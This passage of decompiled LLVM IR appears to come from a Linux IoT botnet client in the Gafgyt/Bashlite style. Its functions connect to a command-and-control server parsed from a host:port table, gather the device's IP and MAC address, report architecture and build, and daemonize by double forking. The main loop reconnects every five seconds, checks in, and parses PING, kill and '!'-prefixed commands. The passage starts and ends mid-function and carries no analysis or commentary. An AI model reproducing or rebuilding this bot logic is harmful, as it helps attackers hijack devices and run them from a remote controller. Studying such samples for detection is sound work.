  store i32 0, i32* @global_var_29910.71, align 4
  br label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %entry, %dec_label_pc_113ac
  %v2_113cc = load i32, i32* @global_var_29584.965, align 4
  %v2_113d0 = icmp eq i32 %v2_113cc, 0
  br i1 %v2_113d0, label %dec_label_pc_113fc, label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113c8
  %v1_113f0 = add i32 %v2_113cc, 1
  br label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %dec_label_pc_113c8, %dec_label_pc_113e8
  %storemerge1 = phi i32 [ %v1_113f0, %dec_label_pc_113e8 ], [ 0, %dec_label_pc_113c8 ]
  store i32 %storemerge1, i32* @global_var_29584.965, align 4
  %v4_11410 = mul i32 %storemerge1, 4
  %v5_11410 = add i32 %v4_11410, ptrtoint ([15 x i8]** @global_var_29024.968 to i32)
  %v6_11410 = inttoptr i32 %v5_11410 to i32*
  %v7_11410 = load i32, i32* %v6_11410, align 4
  %v2_1141c = inttoptr i32 %v7_11410 to i8*
  %v3_1141c = call i32 @strcpy(i32 %v2_11388, i8* %v2_1141c)
  %v2_11430 = call i32 @__GI_strchr(i32 %v2_11388, i32 58)
  %v2_11438 = icmp eq i32 %v2_11430, 0
  br i1 %v2_11438, label %dec_label_pc_11494, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_113fc
  %v2_11450 = call i32 @__GI_strchr(i32 %v2_11388, i32 58)
  %v1_11458 = add i32 %v2_11450, 1
  store i32 %v1_11458, i32* @r0, align 4
  %v1_11460 = call i32 @atol(i32 %v1_11458)
  store i32 %v1_11460, i32* @global_var_29028.970, align 4
  %v2_11480 = call i32 @__GI_strchr(i32 %v2_11388, i32 58)
  %v3_11490 = inttoptr i32 %v2_11480 to i8*
  store i8 0, i8* %v3_11490, align 1
  br label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_113fc, %dec_label_pc_11440
  %v0_114a0 = call i32 @socket()
  store i32 %v0_114a0, i32* @global_var_29910.71, align 4
  %v2_114c4 = load i32, i32* @global_var_29028.970, align 4
  %v4_114d4 = call i32 @connectTimeout(i32 %v0_114a0, i32 %v2_11388, i32 %v2_114c4, i32 30)
  %v2_114dc = icmp eq i32 %v4_114d4, 0
  %. = zext i1 %v2_114dc to i32
  store i32 %v3_11374, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 30, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_29028.970, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11494, { 1, 0 }
  uselistorder label %dec_label_pc_113fc, { 1, 0 }
  uselistorder label %dec_label_pc_113c8, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11528 = load i32, i32* @fp, align 4
  store i32 %v3_11528, i32* %stack_var_-16, align 4
  %v0_11544 = call i32 @socket()
  %v3_11554 = icmp eq i32 %v0_11544, -1
  br i1 %v3_11554, label %dec_label_pc_1155c, label %dec_label_pc_1156c

dec_label_pc_1155c:                               ; preds = %entry
  br label %dec_label_pc_117d4

dec_label_pc_1156c:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1f7f0.972 to i32), i32* @r0, align 4
  %v2_115b0 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1f7f0.972 to i32))
  %v1_115c0 = call i32 @htons(i32 53)
  %v3_115e4 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_115e4 = call i32 @__libc_connect(i32 %v0_11544, %sockaddr* %v3_115e4, i32 16)
  %v3_115f4 = icmp eq i32 %v4_115e4, -1
  br i1 %v3_115f4, label %dec_label_pc_115fc, label %dec_label_pc_1160c

dec_label_pc_115fc:                               ; preds = %dec_label_pc_1156c
  br label %dec_label_pc_117d4

dec_label_pc_1160c:                               ; preds = %dec_label_pc_1156c
  store i32 16, i32* %stack_var_-72, align 4
  %v2_11614 = ptrtoint i32* %stack_var_-68 to i32
  %v2_11618 = ptrtoint i32* %stack_var_-72 to i32
  %v5_11624 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_11624 = call i32 @__GI_getsockname(i32 %v0_11544, %sockaddr* %v5_11624, i32 %v2_11618, i32 %v2_11614, i32 16)
  %v3_11634 = icmp eq i32 %v6_11624, -1
  br i1 %v3_11634, label %dec_label_pc_1163c, label %dec_label_pc_1164c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_1160c
  br label %dec_label_pc_117d4

dec_label_pc_1164c:                               ; preds = %dec_label_pc_1160c
  store i32 ptrtoint (i32* @global_var_2fb88.587 to i32), i32* @r2, align 4
  %v4_11660 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f7f8.975, i32 0, i32 0), i32 0)
  %v2_116f8 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_116f0

dec_label_pc_11670:                               ; preds = %dec_label_pc_116f0
  %v4_11684 = call i32 @strstr(i32 %v2_116f8, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f808.977, i32 0, i32 0))
  %v2_1168c = icmp eq i32 %v4_11684, 0
  br i1 %v2_1168c, label %dec_label_pc_116d4, label %dec_label_pc_116b4.preheader

dec_label_pc_116b4.preheader:                     ; preds = %dec_label_pc_11670
  %v2_116b89 = load i8, i8* %stack_var_-4168, align 1
  %v7_116bc13 = icmp eq i8 %v2_116b89, 9
  br i1 %v7_116bc13, label %dec_label_pc_116c4, label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_116b4.preheader, %dec_label_pc_116a8
  %v4_116b414 = phi i32 [ %v1_116ac, %dec_label_pc_116a8 ], [ %v2_116f8, %dec_label_pc_116b4.preheader ]
  %v1_116ac = add i32 %v4_116b414, 1
  %v5_116b0 = inttoptr i32 %v1_116ac to i8*
  %v2_116b8 = load i8, i8* %v5_116b0, align 1
  %v7_116bc = icmp eq i8 %v2_116b8, 9
  br i1 %v7_116bc, label %dec_label_pc_116c4, label %dec_label_pc_116a8

dec_label_pc_116c4:                               ; preds = %dec_label_pc_116a8, %dec_label_pc_116b4.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_116b4.preheader ], [ %v5_116b0, %dec_label_pc_116a8 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_11718

dec_label_pc_116d4:                               ; preds = %dec_label_pc_11670
  store i32 4096, i32* @r2, align 4
  %v3_116ec = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_116f0

dec_label_pc_116f0:                               ; preds = %dec_label_pc_1164c, %dec_label_pc_116d4
  %v4_11708 = call i32 @fdgets(i32 %v2_116f8, i32 4096, i32 %v4_11660, i32 %v2_116f8)
  %v2_11710 = icmp eq i32 %v4_11708, 0
  br i1 %v2_11710, label %dec_label_pc_11718, label %dec_label_pc_11670

dec_label_pc_11718:                               ; preds = %dec_label_pc_116f0, %dec_label_pc_116c4
  %v1_1171c = call i32 @__libc_close(i32 %v4_11660)
  %v4_1172c = load i8, i8* %stack_var_-4168, align 1
  %v2_11730 = icmp eq i8 %v4_1172c, 0
  br i1 %v2_11730, label %dec_label_pc_117c8, label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_11718
  %v2_11740 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_11758 = call i32 @strcpy(i32 %v2_11740, i8* nonnull %stack_var_-4168)
  %v3_11778 = call i32 @ioctl(i32 %v0_11544, i32 35111, i32 %v2_11740)
  %v2_11798 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_11788

dec_label_pc_11788:                               ; preds = %dec_label_pc_11738, %dec_label_pc_11788
  %storemerge47 = phi i32 [ 0, %dec_label_pc_11738 ], [ %v1_117b4, %dec_label_pc_11788 ]
  %v2_117a0 = add i32 %storemerge47, %v2_11798
  %v1_117a4 = inttoptr i32 %v2_117a0 to i8*
  %v2_117a4 = load i8, i8* %v1_117a4, align 1
  %v4_117ac = add i32 %storemerge47, ptrtoint (i32* @global_var_2991c.979 to i32)
  %v5_117ac = inttoptr i32 %v4_117ac to i8*
  store i8 %v2_117a4, i8* %v5_117ac, align 1
  %v1_117b4 = add nuw nsw i32 %storemerge47, 1
  %v7_117c4 = icmp slt i32 %v1_117b4, 6
  br i1 %v7_117c4, label %dec_label_pc_11788, label %dec_label_pc_117c8

dec_label_pc_117c8:                               ; preds = %dec_label_pc_11788, %dec_label_pc_11718
  %v1_117cc = call i32 @__libc_close(i32 %v0_11544)
  %v3_117e8.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_117e4

dec_label_pc_117d4:                               ; preds = %dec_label_pc_1163c, %dec_label_pc_115fc, %dec_label_pc_1155c
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_117e4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_117c8, %dec_label_pc_117d4
  %v3_117e8 = phi i32 [ %v3_117e8.pre, %dec_label_pc_117c8 ], [ 0, %dec_label_pc_117d4 ]
  %v2_117f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_117f0, i32* @fp, align 4
  ret i32 %v3_117e8

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_116ac, { 1, 0 }
  uselistorder i32 %v2_116f8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_11544, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 6, 5, 4, 7, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_117e4, { 1, 0 }
  uselistorder label %dec_label_pc_11788, { 1, 0 }
  uselistorder label %dec_label_pc_116f0, { 1, 0 }
  uselistorder label %dec_label_pc_116a8, { 1, 0 }
}

define i32 @archType() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1f814.981 to i32)
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_1183c = call i32 @access()
  %v7_11844 = icmp eq i32 %v0_1183c, -1
  %v4_11860 = select i1 %v7_11844, i32 ptrtoint ([7 x i8]* @global_var_1f834.987 to i32), i32 ptrtoint ([7 x i8]* @global_var_1f82c.985 to i32)
  ret i32 %v4_11860
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-1160 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1187c = load i32, i32* @r4, align 4
  store i32 %v3_1187c, i32* %stack_var_-28, align 4
  store i32 71812, i32* %stack_var_-4, align 4
  %v22_1187c = ptrtoint i32* %stack_var_-28 to i32
  %v2_11880 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11880, i32* @fp, align 4
  %v0_118bc = call i32 @access()
  store i32 %v0_118bc, i32* @r0, align 4
  %v7_118c4 = icmp eq i32 %v0_118bc, -1
  %. = select i1 %v7_118c4, i32 ptrtoint ([19 x i8]* @global_var_1f840.993 to i32), i32 ptrtoint ([5 x i8]* @global_var_1db94.742 to i32)
  %v0_118e0 = call i32 @geteuid()
  %v2_118e8 = icmp eq i32 %v0_118e0, 0
  br i1 %v2_118e8, label %dec_label_pc_118f0, label %dec_label_pc_118fc

dec_label_pc_118f0:                               ; preds = %entry
  store i32 0, i32* @global_var_29580.995, align 4
  br label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %entry, %dec_label_pc_118f0
  %v0_118fc = call i32 @getBuild()
  %v1_11918 = bitcast i8** %argv to i32*
  %v2_11918 = load i32, i32* %v1_11918, align 4
  store i32 %v2_11918, i32* @r4, align 4
  %v2_11930 = load i32, i32* %v1_11918, align 4
  %v1_11934 = inttoptr i32 %v2_11930 to i8*
  %v3_11938 = call i32 @strlen(i8* %v1_11934)
  %v0_11940 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1f83c.989 to i32), i32* @r1, align 4
  %v3_1194c = call i32 @strncpy(i32 %v0_11940, i32 ptrtoint (i32* @global_var_1f83c.989 to i32), i32 %v3_11938)
  %v2_11960 = load i32, i32* %v1_11918, align 4
  store i32 %v2_11960, i32* @r0, align 4
  %v3_1196c = call i32 @sprintf(i32 %v2_11960, i32 %.)
  %v0_11990 = call i32 @prctl()
  %v2_11998 = call i32 @__GI_time(i32* null)
  store i32 %v2_11998, i32* @r4, align 4
  %v0_119a0 = call i32 @__libc_getpid()
  %v0_119a8 = load i32, i32* @r4, align 4
  %v2_119a8 = xor i32 %v0_119a8, %v0_119a0
  %v1_119b0 = call i32 @srand(i32 %v2_119a8)
  %v2_119b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_119b8, i32* @r4, align 4
  %v0_119c0 = call i32 @__libc_getpid()
  %v0_119c8 = load i32, i32* @r4, align 4
  %v2_119c8 = xor i32 %v0_119c8, %v0_119c0
  %v1_119d0 = call i32 @init_rand(i32 %v2_119c8)
  %v1_119d4 = call i32 @getOurIP(i32 %v1_119d0)
  %v0_119d8 = call i32 @__libc_fork()
  %v2_119e8 = icmp eq i32 %v0_119d8, 0
  br i1 %v2_119e8, label %dec_label_pc_11a18, label %dec_label_pc_11a0c

dec_label_pc_11a0c:                               ; preds = %dec_label_pc_118fc
  %v2_119f0 = ptrtoint i32* %stack_var_-96 to i32
  %v3_11a00 = call i32 @__libc_waitpid(i32 %v0_119d8, i32 %v2_119f0, i32 0)
  %v1_11a08 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11a38

dec_label_pc_11a18:                               ; preds = %dec_label_pc_118fc
  %v0_11a18 = call i32 @__libc_fork()
  %v2_11a28 = icmp eq i32 %v0_11a18, 0
  br i1 %v2_11a28, label %dec_label_pc_11a38, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_11a18
  %v1_11a34 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a0c, %dec_label_pc_11a18, %dec_label_pc_11a30
  %v0_11a38 = call i32 @__GI_setsid()
  %v0_11a40 = call i32 @chdir()
  %v2_11a4c = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_122ac = ptrtoint i32* %stack_var_-5256 to i32
  %v4_122bc = bitcast i32* %stack_var_-5256 to i8*
  %v2_11dac = add i32 %v22_1187c, -5228
  %v1_11ecc = or i32 %v2_122ac, 1
  %v5_11ed0 = inttoptr i32 %v1_11ecc to i8*
  %v2_11eec = or i32 %v2_122ac, 2
  %v2_12048 = ptrtoint i32* %stack_var_-1160 to i32
  %v2_12058 = bitcast i32* %stack_var_-1160 to i8*
  %v2_1226c = add i32 %v22_1187c, -108
  br label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a64, %dec_label_pc_1229c, %dec_label_pc_11a38
  %v0_11a54 = call i32 @initConnection()
  %v2_11a5c = icmp eq i32 %v0_11a54, 0
  br i1 %v2_11a5c, label %dec_label_pc_11a70, label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a54
  %v1_11a68 = call i32 @sleep(i32 5)
  br label %dec_label_pc_11a54

dec_label_pc_11a70:                               ; preds = %dec_label_pc_11a54
  %v2_11a74 = load i32, i32* @global_var_29910.71, align 4
  store i32 %v2_11a74, i32* @r4, align 4
  %v0_11a78 = call i32 @getBuild()
  store i32 %v0_11a78, i32* @r5, align 4
  %v2_11a84 = load i32, i32* @global_var_2fb88.587, align 4
  store i32 %v2_11a84, i32* @r0, align 4
  %v1_11a88 = call i32 @__GI_inet_ntoa(i32 %v2_11a84)
  store i32 %v1_11a88, i32* @r6, align 4
  %v0_11a90 = call i32 @archType()
  %v0_11a9c = load i32, i32* @r4, align 4
  %v0_11aa4 = load i32, i32* @r5, align 4
  store i32 %v0_11aa4, i32* @r2, align 4
  %v3_11aac = call i32 @sockprintf(i32 %v0_11a9c, i32 ptrtoint ([43 x i8]* @global_var_1f858.1001 to i32))
  br label %dec_label_pc_1229c

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11d84, %dec_label_pc_11d28
  %v3_11ad4 = mul i32 %storemerge14, 4
  %v2_11ae0 = load i32, i32* @global_var_2fb94.80, align 4
  %v2_11ae4 = add i32 %v2_11ae0, %v3_11ad4
  %v1_11ae8 = inttoptr i32 %v2_11ae4 to i32*
  %v2_11ae8 = load i32, i32* %v1_11ae8, align 4
  %v3_11af8 = call i32 @__libc_waitpid(i32 %v2_11ae8, i32 0, i32 1)
  %tmp104 = icmp slt i32 %v3_11af8, 1
  br i1 %tmp104, label %dec_label_pc_11d1c, label %dec_label_pc_11b60

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11b60, %dec_label_pc_11bb8
  %v3_11b1c = mul i32 %v1_11b0c, 4
  %v2_11b28 = load i32, i32* @global_var_2fb94.80, align 4
  %v2_11b2c = add i32 %v2_11b28, %v3_11b1c
  %v1_11b30 = add i32 %v2_11b2c, -4
  %v1_11b4c = inttoptr i32 %v2_11b2c to i32*
  %v2_11b4c = load i32, i32* %v1_11b4c, align 4
  %v2_11b50 = inttoptr i32 %v1_11b30 to i32*
  store i32 %v2_11b4c, i32* %v2_11b50, align 4
  br label %dec_label_pc_11b60

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11b18
  %v3_11b08.sink = phi i32 [ %v1_11b0c, %dec_label_pc_11b18 ], [ %storemerge14, %dec_label_pc_11ad0 ]
  %v1_11b0c = add i32 %v3_11b08.sink, 1
  %v2_11b78 = load i32, i32* @global_var_29914.77, align 4
  %v9_11b98 = icmp eq i32 %v2_11b78, 0
  br i1 %v9_11b98, label %dec_label_pc_11bb8, label %dec_label_pc_11b18

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b60
  %v5_11b78 = load i32, i32* @global_var_29918.78, align 4
  %tmp105 = icmp ugt i32 %v5_11b78, %v1_11b0c
  br i1 %tmp105, label %dec_label_pc_11b18, label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11bb8
  %v3_11bd4 = mul i32 %v1_11b0c, 4
  %v2_11be0 = load i32, i32* @global_var_2fb94.80, align 4
  %v2_11be4 = add i32 %v3_11bd4, -4
  %v1_11be8 = add i32 %v2_11be4, %v2_11be0
  %v2_11bf0 = inttoptr i32 %v1_11be8 to i32*
  store i32 0, i32* %v2_11bf0, align 4
  %v2_11bf8 = load i32, i32* @global_var_29914.77, align 4
  %v5_11bf8 = load i32, i32* @global_var_29918.78, align 4
  %v2_11c04 = add i32 %v2_11bf8, -1
  %v3_11c04 = icmp ne i32 %v2_11bf8, 0
  %v3_11c08 = add i32 %v5_11bf8, -1
  %v4_11c08 = zext i1 %v3_11c04 to i32
  %v5_11c08 = add i32 %v3_11c08, %v4_11c08
  store i32 %v2_11c04, i32* @global_var_29914.77, align 4
  store i32 %v5_11c08, i32* @global_var_29918.78, align 4
  %v3_11c1c = udiv i32 %v2_11c04, 1073741824
  %v3_11c20 = mul i32 %v5_11c08, 4
  %v2_11c24 = or i32 %v3_11c20, %v3_11c1c
  store i32 %v2_11c24, i32* @r4, align 4
  %v3_11c28 = mul i32 %v2_11c04, 4
  %v1_11c2c = add i32 %v3_11c28, 4
  %v1_11c34 = call i32 @malloc(i32 %v1_11c2c)
  br label %dec_label_pc_11c8c

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c8c, %dec_label_pc_11ce8
  %v3_11c50 = mul i32 %storemerge19, 4
  %v2_11c5c = add i32 %v3_11c50, %v1_11c34
  %v2_11c70 = load i32, i32* @global_var_2fb94.80, align 4
  %v2_11c74 = add i32 %v2_11c70, %v3_11c50
  %v1_11c78 = inttoptr i32 %v2_11c74 to i32*
  %v2_11c78 = load i32, i32* %v1_11c78, align 4
  %v2_11c7c = inttoptr i32 %v2_11c5c to i32*
  store i32 %v2_11c78, i32* %v2_11c7c, align 4
  %v1_11c84 = add i32 %storemerge19, 1
  br label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11bd0, %dec_label_pc_11c4c
  %storemerge19 = phi i32 [ 0, %dec_label_pc_11bd0 ], [ %v1_11c84, %dec_label_pc_11c4c ]
  %v2_11ca8 = load i32, i32* @global_var_29914.77, align 4
  %v9_11cc8 = icmp eq i32 %v2_11ca8, 0
  br i1 %v9_11cc8, label %dec_label_pc_11ce8, label %dec_label_pc_11c4c

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11c8c
  %v5_11ca8 = load i32, i32* @global_var_29918.78, align 4
  %tmp = icmp ugt i32 %v5_11ca8, %storemerge19
  br i1 %tmp, label %dec_label_pc_11c4c, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11ce8
  %v2_11d04 = load i32, i32* @global_var_2fb94.80, align 4
  %v1_11d0c = call i32 @free(i32 %v2_11d04)
  store i32 %v1_11c34, i32* @global_var_2fb94.80, align 4
  br label %dec_label_pc_11d1c

dec_label_pc_11d1c:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11d00
  %v1_11d20 = add i32 %storemerge14, 1
  br label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_1229c, %dec_label_pc_11d1c
  %storemerge14 = phi i32 [ %v1_11d20, %dec_label_pc_11d1c ], [ 0, %dec_label_pc_1229c ]
  %v3_11d30 = ashr i32 %storemerge14, 31
  %v2_11d44 = load i32, i32* @global_var_29914.77, align 4
  %v5_11d44 = load i32, i32* @global_var_29918.78, align 4
  %v3_11d64 = icmp uge i32 %v2_11d44, %v3_11d30
  %v9_11d64 = icmp eq i32 %v2_11d44, %v3_11d30
  %v2_11d68 = xor i1 %v9_11d64, true
  %v3_11d68 = and i1 %v3_11d64, %v2_11d68
  br i1 %v3_11d68, label %dec_label_pc_11ad0, label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d28
  br i1 %v9_11d64, label %dec_label_pc_11d84, label %dec_label_pc_11d9c

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d6c
  %tmp118 = icmp ugt i32 %v5_11d44, %storemerge14
  br i1 %tmp118, label %dec_label_pc_11ad0, label %dec_label_pc_11d9c

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11d6c, %dec_label_pc_11d84
  %v2_11db0 = add i32 %v2_11dac, %v5_122bc
  %v3_11db8 = inttoptr i32 %v2_11db0 to i8*
  store i8 0, i8* %v3_11db8, align 1
  %v2_11dcc = call i32 @trim(i8* %v4_122bc)
  %v4_11de4 = call i32 @strstr(i32 %v2_122ac, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e5d0.73, i32 0, i32 0))
  store i32 %v4_11de4, i32* @r2, align 4
  %v9_11df8 = icmp eq i32 %v4_11de4, %v2_122ac
  br i1 %v9_11df8, label %dec_label_pc_11e00, label %dec_label_pc_11e18

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11d9c
  %v2_11e04 = load i32, i32* @global_var_29910.71, align 4
  %v3_11e10 = call i32 @sockprintf(i32 %v2_11e04, i32 ptrtoint ([5 x i8]* @global_var_1f884.1006 to i32))
  br label %dec_label_pc_1229c

dec_label_pc_11e18:                               ; preds = %dec_label_pc_11d9c
  %v6_11e2c = call i32 @strstr(i32 %v2_122ac, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f88c.1008, i32 0, i32 0))
  %v9_11e40 = icmp eq i32 %v6_11e2c, %v2_122ac
  br i1 %v9_11e40, label %dec_label_pc_11e48, label %dec_label_pc_11e50

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e18
  %v1_11e4c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11e50

dec_label_pc_11e50:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11e48
  %v2_11e64 = load i8, i8* %v4_122bc, align 4
  %v7_11e68 = icmp eq i8 %v2_11e64, 33
  br i1 %v7_11e68, label %dec_label_pc_11e8c, label %dec_label_pc_1229c

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e50, %dec_label_pc_11e9c
  %v3_11e70.sink = phi i8* [ %storemerge8, %dec_label_pc_11e9c ], [ %v4_122bc, %dec_label_pc_11e50 ]
  %v4_11e70 = ptrtoint i8* %v3_11e70.sink to i32
  %v1_11e74 = add i32 %v4_11e70, 1
  %storemerge8 = inttoptr i32 %v1_11e74 to i8*
  %v2_11e90 = load i8, i8* %storemerge8, align 1
  %v7_11e94 = icmp eq i8 %v2_11e90, 32
  br i1 %v7_11e94, label %dec_label_pc_11eac, label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11e8c
  %v2_11ea0 = load i8, i8* %storemerge8, align 1
  %v2_11ea4 = icmp eq i8 %v2_11ea0, 0
  br i1 %v2_11ea4, label %dec_label_pc_11eac, label %dec_label_pc_11e8c

dec_label_pc_11eac:                               ; preds = %dec_label_pc_11e9c, %dec_label_pc_11e8c
  %v2_11eb0 = load i8, i8* %storemerge8, align 1
  %v2_11eb4 = icmp eq i8 %v2_11eb0, 0
  br i1 %v2_11eb4, label %dec_label_pc_1229c, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11eac
  store i8 0, i8* %storemerge8, align 1
  %v3_11edc = call i32 @strlen(i8* %v5_11ed0)
  %v1_11ef0 = add i32 %v3_11edc, %v2_11eec
  %v5_11ef4 = inttoptr i32 %v1_11ef0 to i8*
  %v2_11f3c = add i32 %v1_11ef0, -1
  br label %dec_label_pc_11f24

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11f50, %dec_label_pc_11f24
  %v3_11f04 = call i32 @strlen(i8* %v5_11ef4)
  %v1_11f18 = add i32 %v2_11f3c, %v3_11f04
  %v3_11f20 = inttoptr i32 %v1_11f18 to i8*
  store i8 0, i8* %v3_11f20, align 1
  br label %dec_label_pc_11f24

dec_label_pc_11f24:                               ; preds = %dec_label_pc_11ebc, %dec_label_pc_11efc
  %v3_11f2c = call i32 @strlen(i8* %v5_11ef4)
  %v1_11f40 = add i32 %v3_11f2c, %v2_11f3c
  %v1_11f44 = inttoptr i32 %v1_11f40 to i8*
  %v2_11f44 = load i8, i8* %v1_11f44, align 1
  %v7_11f48 = icmp eq i8 %v2_11f44, 10
  br i1 %v7_11f48, label %dec_label_pc_11efc, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f24
  %v3_11f58 = call i32 @strlen(i8* %v5_11ef4)
  %v1_11f6c = add i32 %v3_11f58, %v2_11f3c
  %v1_11f70 = inttoptr i32 %v1_11f6c to i8*
  %v2_11f70 = load i8, i8* %v1_11f70, align 1
  %v7_11f74 = icmp eq i8 %v2_11f70, 13
  br i1 %v7_11f74, label %dec_label_pc_11efc, label %dec_label_pc_11f7c

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11f50
  %v2_11f9822 = load i8, i8* %v5_11ef4, align 1
  %v7_11f9c26 = icmp eq i8 %v2_11f9822, 32
  br i1 %v7_11f9c26, label %dec_label_pc_11fb4, label %dec_label_pc_11fa4

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11fa4
  %v1_11f8c = add i32 %v4_11f9428, 1
  %v5_11f90 = inttoptr i32 %v1_11f8c to i8*
  %v2_11f98 = load i8, i8* %v5_11f90, align 1
  %v7_11f9c = icmp eq i8 %v2_11f98, 32
  br i1 %v7_11f9c, label %dec_label_pc_11fb4, label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f7c, %dec_label_pc_11f88
  %v4_11f9428 = phi i32 [ %v1_11f8c, %dec_label_pc_11f88 ], [ %v1_11ef0, %dec_label_pc_11f7c ]
  %stack_var_-68.027 = phi i8* [ %v5_11f90, %dec_label_pc_11f88 ], [ %v5_11ef4, %dec_label_pc_11f7c ]
  %v2_11fa8 = load i8, i8* %stack_var_-68.027, align 1
  %v2_11fac = icmp eq i8 %v2_11fa8, 0
  br i1 %v2_11fac, label %dec_label_pc_11fb4, label %dec_label_pc_11f88

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11f88, %dec_label_pc_11fa4, %dec_label_pc_11f7c
  %stack_var_-68.0.lcssa = phi i8* [ %v5_11ef4, %dec_label_pc_11f7c ], [ %v5_11f90, %dec_label_pc_11f88 ], [ %stack_var_-68.027, %dec_label_pc_11fa4 ]
  %v4_11f94.lcssa = phi i32 [ %v1_11ef0, %dec_label_pc_11f7c ], [ %v1_11f8c, %dec_label_pc_11f88 ], [ %v4_11f9428, %dec_label_pc_11fa4 ]
  store i8 0, i8* %stack_var_-68.0.lcssa, align 1
  %v1_11fc4 = add i32 %v4_11f94.lcssa, 1
  %v2_1200833 = load i8, i8* %v5_11ef4, align 1
